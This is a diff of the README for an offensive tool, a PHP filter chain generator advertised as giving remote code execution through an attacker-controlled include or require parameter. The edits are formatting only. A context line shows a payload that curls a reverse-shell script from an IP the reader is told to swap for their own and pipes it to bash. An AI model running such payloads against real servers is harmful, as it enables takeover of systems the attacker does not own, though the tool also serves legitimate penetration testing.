@@ -2,7 +2,7 @@
 A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!
 
 # Usage
-## Usage
+
 
 ### Help
 
@@ -37,7 +37,7 @@ Then create a chain using a generator.
 Replace the ip address with your own.
 
 
-# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
+ `<?= ?>` is a shorthand for `<?php echo ~ ?>`
 
 ```text
 python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
